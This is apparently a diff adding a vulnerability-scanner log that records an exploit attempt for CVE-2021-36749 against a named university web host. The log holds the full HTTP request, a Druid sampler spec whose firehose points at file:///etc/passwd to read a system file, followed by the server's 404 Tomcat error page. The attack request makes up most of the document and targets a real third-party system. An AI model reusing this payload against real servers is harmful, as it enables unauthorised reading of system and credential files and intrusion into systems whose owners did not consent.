@@ -1,0 +1,24 @@
+[CVE-2021-36749] Dumped HTTP request for https://edtech.le.unimelb.edu.au/druid/indexer/v1/sampler?for=connect
+
+
+POST /druid/indexer/v1/sampler?for=connect HTTP/1.1
+Host: edtech.le.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Connection: close
+Content-Length: 410
+Content-Type: application/json
+Accept-Encoding: gzip
+
+{"type":"index","spec":{"type":"index","ioConfig":{"type":"index","firehose":{"type":"http","uris":[" file:///etc/passwd "]}},"dataSchema":{"dataSource":"sample","parser":{"type":"string", "parseSpec":{"format":"regex","pattern":"(.*)","columns":["a"],"dimensionsSpec":{},"timestampSpec":{"column":"no_ such_ column","missingValue":"2010-01-01T00:00:00Z"}}}}},"samplerConfig":{"numRows":500,"timeoutMs":15000}}
+[CVE-2021-36749] Dumped HTTP response https://edtech.le.unimelb.edu.au/druid/indexer/v1/sampler?for=connect
+
+HTTP/1.1 404 Not Found
+Connection: close
+Content-Length: 999
+Content-Type: text/html;charset=utf-8
+Date: Wed, 06 Aug 2025 15:17:32 GMT
+Server: Apache
+Set-Cookie: BIGipServer~app_047s-prod_prod~pool_047s-prod_prod=851842988.47873.0000; path=/; Httponly; Secure
+Strict-Transport-Security: max-age=63072000; preload
+
+<html><head><title>Apache Tomcat/6.0.53 - Error report</title><style><!--H1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} H2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} H3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} BODY {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} B {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} P {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;}A {color : black;}A.name {color : black;}HR {color : #525D76;}--></style> </head><body><h1>HTTP Status 404 - /druid/indexer/v1/sampler</h1><HR size="1" noshade="noshade"><p><b>type</b> Status report</p><p><b>message</b> <u>/druid/indexer/v1/sampler</u></p><p><b>description</b> <u>The requested resource is not available.</u></p><HR size="1" noshade="noshade"><h3>Apache Tomcat/6.0.53</h3></body></html>
